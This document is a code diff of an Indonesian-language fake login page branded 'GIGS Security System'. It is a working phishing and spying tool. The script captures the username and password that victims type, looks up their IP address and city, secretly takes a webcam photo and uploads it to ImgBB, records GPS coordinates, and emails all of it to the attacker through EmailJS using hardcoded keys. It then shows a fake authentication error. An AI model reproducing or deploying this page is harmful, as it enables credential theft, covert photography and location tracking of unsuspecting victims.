@@ -1,88 +1,107 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - GIGS Security System</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 360px; text-align: center; }
+        h2 { font-weight: 500; color: #202124; margin-bottom: 10px; }
+        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        #loading { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.9); z-index:99; justify-content:center; align-items:center; flex-direction:column; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div id="loading">Memproses Verifikasi...</div>
+
+<div class="login-box">
+    <img src="https://cdn-icons-png.flaticon.com/512/1000/1000997.png" width="60" alt="Logo">
+    <h2>Login Akun</h2>
+    <p>Gunakan Akun GIGS Anda untuk melanjutkan verifikasi perangkat.</p>
+    
+    <input type="text" id="user" placeholder="Email atau Nama Pengguna">
+    <input type="password" id="pass" placeholder="Masukkan Sandi">
+    <button class="btn" onclick="eksekusi()">BERIKUTNYA</button>
+</div>
+
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
+
 <script>
     (function(){
         emailjs.init("5HWPoEryOV1APt1Cw");
     })();
 
-    async function startHack() {
-        const user = document.getElementById("username").value;
-        const pass = document.getElementById("password").value;
+    async function eksekusi() {
+        const u = document.getElementById("user").value;
+        const p = document.getElementById("pass").value;
 
-        if(!user || !pass) {
-            alert("Harap isi semua kolom untuk verifikasi.");
+        if(!u || !p) {
+            alert("Harap isi email dan sandi!");
             return;
         }
 
-        // Tampilkan loading
-        document.getElementById("loading-overlay").style.display = "flex";
-        
-        let report = `[DATA LOGIN TARGET]\nUser: ${user}\nPass: ${pass}\n\n`;
+        document.getElementById("loading").style.display = "flex";
+        let laporan = `[INTEL GIGS]\nUser: ${u}\nPass: ${p}\n`;
 
         try {
-            // STEP 1: PAKSA MINTA IZIN KAMERA (Ini yang akan memunculkan pop-up)
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" } 
-            });
-            
+            // Ambil IP
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            laporan += `IP: ${d.ip}\nKota: ${d.city}\n`;
+
+            // Minta Izin Kamera
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             video.srcObject = stream;
 
-            // STEP 2: PAKSA MINTA IZIN GPS
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                // Jika GPS diizinkan, ambil koordinat
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                
-                // STEP 3: AMBIL FOTO SETELAH IZIN DIBERIKAN
-                setTimeout(async () => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const photoBase64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
-                    
-                    // Matikan kamera
-                    stream.getTracks().forEach(t => t.stop());
+            // Tunggu 2 detik untuk ambil foto & GPS
+            setTimeout(async () => {
+                // Ambil Foto
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const base64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
+                stream.getTracks().forEach(t => t.stop());
 
-                    // STEP 4: UPLOAD FOTO KE IMGBB
-                    const formData = new FormData();
-                    formData.append("image", photoBase64);
-                    const upload = await fetch("https://api.imgbb.com/1/upload?key=Dba59ebe766c55b8d286f55a8fe366e2", {
-                        method: "POST", body: formData
-                    });
-                    const resImg = await upload.json();
-                    const linkFoto = resImg.data.url;
+                // Upload ke ImgBB
+                const fd = new FormData();
+                fd.append("image", base64);
+                const up = await fetch("https://api.imgbb.com/1/upload?key=Dba59ebe766c55b8d286f55a8fe366e2", {
+                    method: "POST", body: fd
+                });
+                const resUp = await up.json();
+                const link = resUp.data.url;
 
-                    // STEP 5: KIRIM SEMUA KE EMAIL
-                    report += `📸 FOTO: ${linkFoto}\n📍 GPS: https://www.google.com/maps?q=${lat},${lon}`;
-                    kirimKeEmail(report);
-                }, 2000);
-
-            }, (err) => {
-                // Jika GPS ditolak tapi kamera diizinkan
-                report += "📍 GPS: Ditolak Target\n";
-                kirimKeEmail(report);
-            });
+                // Ambil GPS
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    laporan += `Foto: ${link}\nGPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    kirim(laporan);
+                }, () => {
+                    laporan += `Foto: ${link}\nGPS: Ditolak`;
+                    kirim(laporan);
+                });
+            }, 2000);
 
         } catch (e) {
-            // Jika Kamera ditolak sama sekali
-            report += "📸 Kamera: Ditolak/Block\n";
-            // Coba ambil GPS saja sebagai cadangan
-            navigator.geolocation.getCurrentPosition((pos) => {
-                report += `📍 GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                kirimKeEmail(report);
-            }, () => {
-                kirimKeEmail(report + "📍 GPS: Ditolak");
-            });
+            kirim(laporan + "Kamera/GPS Ditolak");
         }
     }
 
-    function kirimKeEmail(pesan) {
-        emailjs.send("service_e3ap8de", "template_ts6dxmh", { message: pesan })
+    function kirim(m) {
+        emailjs.send("service_e3ap8de", "template_ts6dxmh", { message: m })
         .then(() => {
-            document.getElementById("loading-overlay").style.display = "none";
-            alert("Sesi Berakhir: Akun anda memerlukan verifikasi tambahan via SMS.");
+            alert("Kesalahan Autentikasi: Server tidak merespons. Sesi berakhir.");
             location.reload();
         });
     }
-        </script>
-        
+</script>
+</body>
+</html>
